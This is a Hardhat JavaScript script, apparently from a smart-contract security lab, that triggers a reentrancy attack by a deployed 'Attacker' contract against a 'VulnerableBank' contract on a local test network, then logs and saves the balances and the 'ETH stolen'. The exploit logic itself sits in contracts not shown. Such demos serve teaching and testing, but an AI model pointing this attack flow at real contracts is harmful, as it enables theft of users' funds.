const { ethers } = require("hardhat");
const fs = require("fs");
const path = require("path");

async function main() {
    const [, , , attackerEOA] = await ethers.getSigners();

    console.log("=".repeat(60));
    console.log("REENTRANCY ATTACK");
    console.log("=".repeat(60));

    // ── Load deployment addresses ──────────────────────────
    const deploymentPath = path.join(__dirname, "..", "deployment.json");
    if (!fs.existsSync(deploymentPath)) {
        throw new Error("deployment.json not found. Run deploy.js first.");
    }
    const deployment = JSON.parse(fs.readFileSync(deploymentPath, "utf8"));
    const bankAddress     = deployment.contracts.VulnerableBank.address;
    const attackerAddress = deployment.contracts.Attacker.address;

    console.log("\n    VulnerableBank :", bankAddress);
    console.log("    Attacker       :", attackerAddress);

    // ── Connect to deployed contracts ──────────────────────
    const VulnerableBank = await ethers.getContractFactory("VulnerableBank");
    const bank = VulnerableBank.attach(bankAddress);

    const Attacker = await ethers.getContractFactory("Attacker");
    const attacker = Attacker.attach(attackerAddress);

    // ── State before attack ────────────────────────────────
    console.log("\n[1] State before attack:");
    const bankBalanceBefore     = await bank.getBalance();
    const attackerBalanceBefore = await attacker.getBalance();
    const attackCountBefore     = await attacker.attackCount();

    console.log("    Bank balance     :", ethers.formatEther(bankBalanceBefore), "ETH");
    console.log("    Attacker balance :", ethers.formatEther(attackerBalanceBefore), "ETH");
    console.log("    Attack count     :", attackCountBefore.toString());

    // ── Execute attack ─────────────────────────────────────
    console.log("\n[2] Executing reentrancy attack...");
    console.log("    Attacker EOA     :", attackerEOA.address);
    console.log("    Sending 1 ETH to trigger attack...");

    const tx = await attacker.connect(attackerEOA).attack({
        value: ethers.parseEther("1")
    });

    console.log("    Transaction sent. Waiting for confirmation...");
    const receipt = await tx.wait();

    console.log("\n[3] Transaction confirmed:");
    console.log("    Hash       :", receipt.hash);
    console.log("    Block      :", receipt.blockNumber);
    console.log("    Gas used   :", receipt.gasUsed.toString());
    console.log("    Status     :", receipt.status === 1 ? "SUCCESS" : "FAILED");

    // ── State after attack ─────────────────────────────────
    console.log("\n[4] State after attack:");
    const bankBalanceAfter     = await bank.getBalance();
    const attackerBalanceAfter = await attacker.getBalance();
    const attackCountAfter     = await attacker.attackCount();

    console.log("    Bank balance     :", ethers.formatEther(bankBalanceAfter), "ETH");
    console.log("    Attacker balance :", ethers.formatEther(attackerBalanceAfter), "ETH");
    console.log("    Attack count     :", attackCountAfter.toString());

    // ── Summary ────────────────────────────────────────────
    console.log("\n[5] Attack summary:");
    const ethStolen = bankBalanceBefore - bankBalanceAfter;
    console.log("    Bank before  :", ethers.formatEther(bankBalanceBefore), "ETH");
    console.log("    Bank after   :", ethers.formatEther(bankBalanceAfter), "ETH");
    console.log("    ETH stolen   :", ethers.formatEther(ethStolen), "ETH");
    console.log("    Re-entries   :", attackCountAfter.toString());
// ── Save attack info ───────────────────────────────────
    const attackInfo = {
        timestamp: new Date().toISOString(),
        transaction: {
            hash:        receipt.hash,
            block:       receipt.blockNumber,
            gasUsed:     receipt.gasUsed.toString(),
            status:      receipt.status === 1 ? "success" : "failed"
        },
        before: {
            bankBalance:     ethers.formatEther(bankBalanceBefore),
            attackerBalance: ethers.formatEther(attackerBalanceBefore),
            attackCount:     attackCountBefore.toString()
        },
        after: {
            bankBalance:     ethers.formatEther(bankBalanceAfter),
            attackerBalance: ethers.formatEther(attackerBalanceAfter),
            attackCount:     attackCountAfter.toString()
        },
        summary: {
            ethStolen:   ethers.formatEther(ethStolen),
            reentries:   attackCountAfter.toString()
        }
    };

    fs.writeFileSync(
        path.join(__dirname, "..", "attack.json"),
        JSON.stringify(attackInfo, null, 2)
    );

    console.log("\n    Saved to attack.json");
    console.log("=".repeat(60));
}

main().catch(console.error);